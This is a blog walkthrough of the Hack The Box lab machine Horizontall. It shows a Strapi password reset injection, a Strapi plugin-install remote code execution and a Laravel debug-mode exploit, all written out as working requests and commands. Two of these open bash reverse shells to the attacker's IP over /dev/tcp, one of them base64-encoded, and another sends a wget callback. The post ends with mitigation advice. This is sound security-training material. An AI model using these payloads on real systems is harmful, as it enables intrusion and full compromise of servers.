---
layout: post
title: Hack The Box Walkthrough - Horizontall
date: 2022-06-18
type: post
tags:
- Walkthrough
- Hacking
- HackTheBox
- Easy
- Machine
permalink: /2022/06/HTB/Horizontall
img: 2022/06/Horizontall/Horizontall.png
---


* Room: Horizontall
* Difficulty: Easy
* URL: [https://app.hackthebox.com/machines/Horizontall](https://app.hackthebox.com/machines/Horizontall)
* Author: [wail99](https://app.hackthebox.com/users/4005)

In this machine, I had to exploit two web applications. A Javascript API built with Strapi, and a PHP application built with Laravel.

## Enumeration

I launched rustscan to look for open ports on the machine.

```bash
$ rustscan -a target.htb -- -A -Pn | tee rust.txt
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍
                                                                                                                                                                                                                                           [~] The config file is expected to be at "/home/ehogue/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'.
Open 10.129.103.47:22
Open 10.129.103.47:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-08 18:49 EDT
...
Scanned at 2022-06-08 18:49:16 EDT for 8s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
  ...
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJqmDVbv9RjhlUzOMmw3SrGPaiDBgdZ9QZ2cKM49jzYB
80/tcp open  http    syn-ack nginx 1.14.0 (Ubuntu)
|_http-title: Did not follow redirect to http://horizontall.htb
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.14.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

...
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.07 seconds
```

The machine had SSH and HTTP opened.

## Web site

I opened my browser and navigated to the site. I was redirected to `horizontall.htb`

```http
HTTP/1.1 301 Moved Permanently
Server: nginx/1.14.0 (Ubuntu)
Date: Wed, 08 Jun 2022 22:49:30 GMT
Content-Type: text/html
Content-Length: 194
Connection: close
Location: http://horizontall.htb
```

I added `horizontall.htb` to my hosts file and reloaded the site.

```bash
$ cat /etc/hosts
127.0.0.1       localhost
10.129.89.91    target target.htb horizontall.htb
```

![Main Site](/assets/images/2022/06/Horizontall/MainSite.png "Main Site")

I looked at the site, checking every link and the source code. I did not see anything of interest. I launched feroxbuster to check for hidden files and folders.


```bash
$ feroxbuster -u http://horizontall.htb -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://horizontall.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET        1l       43w      901c http://horizontall.htb/
301      GET        7l       13w      194c http://horizontall.htb/js => http://horizontall.htb/js/
301      GET        7l       13w      194c http://horizontall.htb/css => http://horizontall.htb/css/
301      GET        7l       13w      194c http://horizontall.htb/img => http://horizontall.htb/img/
403      GET        7l       11w      178c http://horizontall.htb/js/
403      GET        7l       11w      178c http://horizontall.htb/css/
403      GET        7l       11w      178c http://horizontall.htb/img/
[####################] - 5m    956808/956808  0s      found:7       errors:564
[####################] - 5m    119601/119601  357/s   http://horizontall.htb
[####################] - 5m    119601/119601  359/s   http://horizontall.htb/
[####################] - 5m    119601/119601  359/s   http://horizontall.htb/js
[####################] - 5m    119601/119601  356/s   http://horizontall.htb/css
[####################] - 5m    119601/119601  357/s   http://horizontall.htb/img
[####################] - 5m    119601/119601  358/s   http://horizontall.htb/js/
[####################] - 5m    119601/119601  358/s   http://horizontall.htb/css/
[####################] - 5m    119601/119601  358/s   http://horizontall.htb/img/

```

It did not find anything. Next I checked for subdomains with wfuzz.

```bash
$ wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t30 --hw 13 -H "Host:FUZZ.horizontall.htb" "http://horizontall.htb/"
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://horizontall.htb/
Total requests: 114441

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000001:   200        1 L      43 W       901 Ch      "www"
000047093:   200        19 L     33 W       413 Ch      "api-prod"

Total time: 0
Processed Requests: 114441
Filtered Requests: 114439
Requests/sec.: 0

```

I added `api-prod.horizontall.htb` to my hosts file and loaded that page. It appeared to be an API built with [Strapi](https://strapi.io/).

![Strapi](/assets/images/2022/06/Horizontall/strapi.png "Strapi")

I launched feroxbuster against this new subdomain. 

```
$ feroxbuster -u http://api-prod.horizontall.htb/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://api-prod.horizontall.htb/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET       19l       33w      413c http://api-prod.horizontall.htb/
200      GET       16l      101w      854c http://api-prod.horizontall.htb/admin
200      GET       16l      101w      854c http://api-prod.horizontall.htb/Admin
403      GET        1l        1w       60c http://api-prod.horizontall.htb/users
200      GET        1l       21w      507c http://api-prod.horizontall.htb/reviews
200      GET       16l      101w      854c http://api-prod.horizontall.htb/ADMIN
403      GET        1l        1w       60c http://api-prod.horizontall.htb/Users
200      GET        1l       21w      507c http://api-prod.horizontall.htb/Reviews
200      GET       16l      101w      854c http://api-prod.horizontall.htb/AdMin
200      GET       16l      101w      854c http://api-prod.horizontall.htb/admiN
[####################] - 2m    119601/119601  0s      found:10      errors:0
[####################] - 2m    119601/119601  864/s   http://api-prod.horizontall.htb/
```

It found an admin page that required authentication.

![Strapi Admin](/assets/images/2022/06/Horizontall/AdminLogin.png "Strapi Admin")

And a `/reviews` endpoint.

```http
GET /reviews HTTP/1.1
Host: api-prod.horizontall.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Pragma: no-cache
Cache-Control: no-cache
```


```http
HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Wed, 08 Jun 2022 23:38:43 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 507
Connection: close
Vary: Origin
Content-Security-Policy: img-src 'self' http:; block-all-mixed-content
Strict-Transport-Security: max-age=31536000; includeSubDomains
X-Frame-Options: SAMEORIGIN
X-XSS-Protection: 1; mode=block
X-Powered-By: Strapi <strapi.io>

[{"id":1,"name":"wail","description":"This is good service","stars":4,"created_at":"2021-05-29T13:23:38.000Z","updated_at":"2021-05-29T13:23:38.000Z"},{"id":2,"name":"doe","description":"i'm satisfied with the product","stars":5,"created_at":"2021-05-29T13:24:17.000Z","updated_at":"2021-05-29T13:24:17.000Z"},{"id":3,"name":"john","description":"create service with minimum price i hop i can buy more in the futur","stars":5,"created_at":"2021-05-29T13:25:26.000Z","updated_at":"2021-05-29T13:25:26.000Z"}]
```

I could do a GET on `/reviews/1` to extract the first review. I played with this a little bit, trying to extract reviews that were not listed. I also tried to POST some reviews. 

Next, I checked for known vulnerabilities in Strapi and found one on [Exploit Database](https://www.exploit-db.com/exploits/50239). This exploit used two vulnerabilities of a beta version of Strapi. It first uses an injection vulnerability in the reset password endpoint to change every user's password. Then it uses the `plugins/install` endpoint to execute arbitrary code.

Before I could use the exploit, I had to make sure the version of Strapi was vulnerable. I navigated to `http://api-prod.horizontall.htb/admin/strapiVersion` and it returned the version '3.0.0-beta.17.4'. This is the vulnerable version.


I then used the first vulnerability to change everyone's passwords to 'SuperStrongPassword1'.

```http
POST /admin/auth/reset-password HTTP/1.1
Host: api-prod.horizontall.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://api-prod.horizontall.htb/admin/auth/forgot-password
Content-Type: application/json
Origin: http://api-prod.horizontall.htb
Content-Length: 146
Connection: close

{
    "code" : {"$gt":0},
    "password" : "SuperStrongPassword1",
    "passwordConfirmation" : "SuperStrongPassword1"
}
```

The answer to that call gave me JWT that I could then use to make authenticated calls. 

```http
HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Thu, 09 Jun 2022 22:32:23 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 249
Connection: close
Vary: Origin
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
Content-Security-Policy: img-src 'self' http:; block-all-mixed-content
Strict-Transport-Security: max-age=31536000; includeSubDomains
X-Frame-Options: SAMEORIGIN
X-XSS-Protection: 1; mode=block
X-Powered-By: Strapi <strapi.io>

{"jwt":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjU0ODEzOTQzLCJleHAiOjE2NTc0MDU5NDN9.GeHHgPPSRxWh2asrmUDIwxktHcl6xyTsPEmFFBEY7b4","user":{"id":3,"username":"admin","email":"admin@horizontall.htb","blocked":null}}
```

Next, I tried using the Remote Code Execution (RCE) vulnerability. The vulnerability is blind, it does not return any results that show if it worked or not. To confirm that it worked, I started a web server on my machine and tried to send a request to it.

```http
POST /admin/plugins/install HTTP/1.1
Host: api-prod.horizontall.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://api-prod.horizontall.htb/admin/auth/forgot-password
Content-Type: application/json
Origin: http://api-prod.horizontall.htb
Content-Length: 95
Connection: close
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjU0ODEzOTQzLCJleHAiOjE2NTc0MDU5NDN9.GeHHgPPSRxWh2asrmUDIwxktHcl6xyTsPEmFFBEY7b4

{
    "plugin" :  "documentation && $(wget http://10.10.14.143/test)",
    "port" : "1337"
}
```

The webserver got the request so I knew I could run any code I wanted on the server.
```bash
$ python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.89.97 - - [18/Jun/2022 13:10:16] code 404, message File not found
10.129.89.97 - - [18/Jun/2022 13:10:16] "GET /test HTTP/1.1" 404 -
```

I used the RCE to get a reverse shell. 

```http
POST /admin/plugins/install HTTP/1.1
Host: api-prod.horizontall.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://api-prod.horizontall.htb/admin/auth/forgot-password
Content-Type: application/json
Origin: http://api-prod.horizontall.htb
Content-Length: 90
Connection: close
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjU0ODEzOTQzLCJleHAiOjE2NTc0MDU5NDN9.GeHHgPPSRxWh2asrmUDIwxktHcl6xyTsPEmFFBEY7b4

{
    "plugin" :  "documentation && $(bash -c 'bash -i >& /dev/tcp/10.10.14.143/4444 0>&1')",
    "port" : "1337"
}
```

My netcat listener got the hit and I could get the first flag. 

```bash
$ nc -klvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.129.103.221 54538
bash: cannot set terminal process group (1892): Inappropriate ioctl for device
bash: no job control in this shell

strapi@horizontall:~/myapi$ whoami
whoami
strapi

strapi@horizontall:~/myapi$ ls /home
ls /home
developer

strapi@horizontall:~/myapi$ ls /home/developer
ls /home/developer
composer-setup.php
myproject
user.txt

strapi@horizontall:~/myapi$ cat /home/developer/user.txt
cat /home/developer/user.txt
REDACTED
```


## Privilege Escalation

Once I was in the machine, I looked for ways to escalate my privileges. But first I wanted to get a better shell. I checked `/etc/passwd` and I saw that the `stapi` user could have a shell on the machine. So I copied my public key to their home directory.

```bash
strapi@horizontall:~$ mkdir .ssh
mkdir .ssh

strapi@horizontall:~$ cd .ssh
cd .ssh

strapi@horizontall:~/.ssh$ echo -n ssh-rsa PUBLIC_KEY > authorized_keys

ehogue@kalistrapi@horizontall:~/.ssh$ chmod 600 authorized_keys
chmod 600 authorized_keys

strapi@horizontall:~/.ssh$ cd ..
cd ..

strapi@horizontall:~$ chmod 700 .ssh
chmod 700 .ssh
```

And I reconnected using ssh. 

```bash
$ ssh strapi@target                                        
The authenticity of host 'target (10.129.89.97)' can't be established.
ED25519 key fingerprint is SHA256:Xe1jfjgC2NgH1uDUUr14erdojTBy+zenI7KtOwu8+ZY.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'target' (ED25519) to the list of known hosts.
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-154-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat Jun 18 17:21:00 UTC 2022

  System load:  0.0               Processes:           177
  Usage of /:   82.0% of 4.85GB   Users logged in:     0
  Memory usage: 27%               IP address for eth0: 10.129.89.97
  Swap usage:   0%


0 updates can be applied immediately.


Last login: Fri Jun  4 11:29:42 2021 from 192.168.1.15
$ bash
strapi@horizontall:~$ 
```

I looked around the machine and found some credentials in the database configuration. Those credentials came as a surprise. With the injection vulnerability using `{"$gt":0}` I was expecting a Mongo database. But it uses MySQL.

```bash
cat config/environments/development/database.json
{
  "defaultConnection": "default",
  "connections": {
    "default": {
      "connector": "strapi-hook-bookshelf",
      "settings": {
        "client": "mysql",
        "database": "strapi",
        "host": "127.0.0.1",
        "port": 3306,
        "username": "developer",
        "password": "#J!:F9Zt2u"
      },
      "options": {}
    }
  }
}
```

I tried the password with `su`, but it failed. I connected to the database and looked at the tables it contained. 

```
strapi@horizontall:~/myapi$ mysql -udeveloper -p
Enter password:
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 22
Server version: 5.7.35-0ubuntu0.18.04.1 (Ubuntu)

Copyright (c) 2000, 2021, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| strapi             |
| sys                |
+--------------------+
5 rows in set (0.01 sec)

mysql> use strapi
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+------------------------------+
| Tables_in_strapi             |
+------------------------------+
| core_store                   |
| reviews                      |
| strapi_administrator         |
| upload_file                  |
| upload_file_morph            |
| users-permissions_permission |
| users-permissions_role       |
| users-permissions_user       |
+------------------------------+
8 rows in set (0.00 sec)


Select * From strapi_administrator;
+----+----------+-----------------------+--------------------------------------------------------------+--------------------+---------+
| id | username | email                 | password                                                     | resetPasswordToken | blocked |
+----+----------+-----------------------+--------------------------------------------------------------+--------------------+---------+
|  3 | admin    | admin@horizontall.htb | $2a$10$/BTsZQYxWduhu9aWMQdD4eNx3ptAB2MQbaG0YrSEaZkKx3bPFvCSu | NULL               |    NULL |
+----+----------+-----------------------+--------------------------------------------------------------+--------------------+---------+
```

The hash looked promising, but it was the hash to 'SuperStrongPassword1', the password I set with the first vulnerability.

I looked for ports the machine was listening on.

```bash
strapi@horizontall:/tmp$ ss -tunlp
Netid  State    Recv-Q   Send-Q      Local Address:Port     Peer Address:Port
udp    UNCONN   0        0                 0.0.0.0:68            0.0.0.0:*
tcp    LISTEN   0        80              127.0.0.1:3306          0.0.0.0:*
tcp    LISTEN   0        128               0.0.0.0:80            0.0.0.0:*
tcp    LISTEN   0        128               0.0.0.0:22            0.0.0.0:*
tcp    LISTEN   0        128             127.0.0.1:1337          0.0.0.0:*       users:(("node",pid=1892,fd=31))
tcp    LISTEN   0        128             127.0.0.1:8000          0.0.0.0:*
tcp    LISTEN   0        128                  [::]:80               [::]:*
tcp    LISTEN   0        128                  [::]:22               [::]:*
```

Port 1337 was used for the Strapi API. But 8000 had a [Laravel](https://laravel.com/) site on it. 

```bash
strapi@horizontall:/tmp$ nc localhost 8000
GET /

HTTP/1.1 200 OK
Date: Thu, 09 Jun 2022 23:34:12 GMT
Connection: close
X-Powered-By: PHP/7.4.22
Content-Type: text/html; charset=UTF-8
Cache-Control: no-cache, private
Date: Thu, 09 Jun 2022 23:34:12 GMT
Set-Cookie: XSRF-TOKEN=eyJpdiI6Im55cENKdWNhQ0dveDJ3RUpyMlJOdFE9PSIsInZhbHVlIjoiT1k0Z3M4UUJCcEpmdE1seHQ4VDJuZ1padldMZEJVall3NlNDQU5KRmcvdndPNjNFaWtDL3FHcDNnUzlLN0pPY1l1Wmh3YlBVSXhEMEo2ek1hSC9Fa25YbVZ0RGVsMlVFNXZnaDlTTlA0VVdxUkFmMTJFM1BY
Nkc3Q0Zjb0xRWFAiLCJtYWMiOiJkZTczY2RlMTRlNWVhODE4YTNjNTAxNzQ1OGMwYWYzMDA2MjYyZmQ5MDZjMjk4OWNhY2E0YzA5MDBjYjE2MmZkIn0%3D; expires=Fri, 10-Jun-2022 01:34:12 GMT; Max-Age=7200; path=/; samesite=lax
Set-Cookie: laravel_session=eyJpdiI6Ikk2d2wwcG96NUpEMUYyOU0zZkFNMHc9PSIsInZhbHVlIjoidDhGUnFvY0JYLzJLVS9UaHIrOGJZOVJpa00vaktNNjc3OFNReTRsRnhhRzZPdUVaemphNjV4VlZBRXM3QTN0UEUzQTRmb0hsYmUwL3VMcDNOdE00ZXdpRjI1amlWOXBIdFpwR01XRFZpbW1lTFV3ck5
lRHFaZ0M3MGFqV2plYUMiLCJtYWMiOiJhNmE1MDhmNjVhNTA5NDA4MDQ0ZWRhYzI4ZDBkZTgzZGVhYmU4ZTA5MTFjMjVkMGVkMWNhNjZlNDNlZTE0YTIyIn0%3D; expires=Fri, 10-Jun-2022 01:34:12 GMT; Max-Age=7200; path=/; httponly; samesite=lax

<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">

        <title>Laravel</title>

        ...
```

The server was only listening to local connections on that port, so I created an SSH tunnel to the machine. 

```bash
$ ssh strapi@target -L 2222:localhost:8000
```

This would take any call I made to port 2222 on my machine and tunnel it to localhost:8000 on the server. With the tunnel on, I looked at the site in a browser. 

![Laravel](/assets/images/2022/06/Horizontall/Laravel.png "Laravel")

It was the default page when creating a Laravel site. Once again, I launched feroxbuster to find hidden pages. 

```bash
$ feroxbuster -u http://localhost:2222/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt 

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://localhost:2222/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET      119l      979w        0c http://localhost:2222/
500      GET      247l    18586w        0c http://localhost:2222/profiles
200      GET       21l       56w      603c http://localhost:2222/.htaccess
[####################] - 43s    63088/63088   0s      found:3       errors:58197  
[####################] - 43s    63088/63088   1448/s  http://localhost:2222/ 
```

Something in feroxbuster killed the SSH connection. But it had time to find a `/profiles` endpoint. I opened `http://localhost:2222/profiles` and it gave me an error page, with a full stack trace. 

![Laravel Error](/assets/images/2022/06/Horizontall/LaravelError.png "Laravel Error")

I found a nice [post](https://www.ambionics.io/blog/laravel-debug-rce) that explained how to use the Laravel Debug page to reset the log file, write some code into it and execute it as a PHAR. I also found some [Python code](https://www.exploit-db.com/exploits/49424) for the exploit. 

I needed the full path of the log file to run the exploit. The application path was provided in the stack trace, so I just had to add `storage/logs/laravel.log` to it.

I downloaded the exploit and tried to use it to run `id`, it did not return anything. 

```bash
$ python 49424.py http://localhost:2222 /home/developer/myproject/storage/logs/laravel.log 'id'

Exploit...
```

I tried to list the current directory, and that worked. 

```bash
➜  Horizontall
$ python 49424.py http://localhost:2222 /home/developer/myproject/storage/logs/laravel.log 'ls -la'

Exploit...

total 24
drwxrwxr-x  2 developer developer 4096 Nov 17  2020 .
drwx------ 12 developer developer 4096 May 26  2021 ..
-rw-rw-r--  1 developer developer    0 Nov 17  2020 favicon.ico
-rw-rw-r--  1 developer developer  603 Nov 17  2020 .htaccess
-rw-rw-r--  1 developer developer 1731 Nov 17  2020 index.php
-rw-rw-r--  1 developer developer   24 Nov 17  2020 robots.txt
-rw-rw-r--  1 developer developer 1194 Nov 17  2020 web.config
```

I then tried to launch a reverse shell, but I got some errors about unterminated quotes. I tried to encode them, but it still failed, so I base64 encoded the payload and sent that instead. 

```bash
$ echo 'bash  -i >& /dev/tcp/10.10.14.143/4445 0>&1 ' | base64
YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTQzLzQ0NDUgMD4mMSAK

python 49424.py http://localhost:2222 /home/developer/myproject/storage/logs/laravel.log 'echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTQzLzQ0NDUgMD4mMSAK | base64 -d | bash'

Exploit...
```

I got the hit on my listener. And to my surprise, I was already root. The Laravel application was running as root. 

```bash
$ nc -klvnp 4445
Listening on 0.0.0.0 4445
Connection received on 10.129.89.69 55586
bash: cannot set terminal process group (22276): Inappropriate ioctl for device
bash: no job control in this shell
root@horizontall:/home/developer/myproject/public# whoami
whoami
root

root@horizontall:/home/developer/myproject/public# ps aux | grep php
ps aux | grep php
root      22759  0.0  0.1  61756  3732 ?        Ss   12:40   0:00 su root -c cd /home/developer/myproject && php artisan serve --port 8000
root      22761  1.3  2.0 321472 41248 ?        Ss   12:40   0:00 php artisan serve --port 8000
root      22769  4.5  2.0 440548 42344 ?        S    12:40   0:00 /usr/bin/php7.4 -S 127.0.0.1:8000 /home/developer/myproject/server.php
root      22785  0.0  0.0  13140   976 ?        S    12:40   0:00 grep --color=auto php

root@horizontall:/home/developer/myproject/public# cd /root
cd /root

root@horizontall:~# ls
ls
boot.sh
pid
restart.sh
root.txt

root@horizontall:~# cat root.txt
cat root.txt
REDACTED
```

## Mitigation

The main issue in that box was that it ran some frameworks with know vulnerabilities. The API was running a beta version of Strapi that had two public vulnerabilities. It's important to keep components up to date. And running a beta in production is risky. 

The Laravel error page also had a known vulnerability. This should be patched. And the debug functionalities of a framework should only be turned on while developing. That site was not supposed to be exposed to the world, but it was running on the same server as another application. It should also not have run as root. Always use a low privilege user to run your web application. This way if it gets abused, the attacker has limited access. 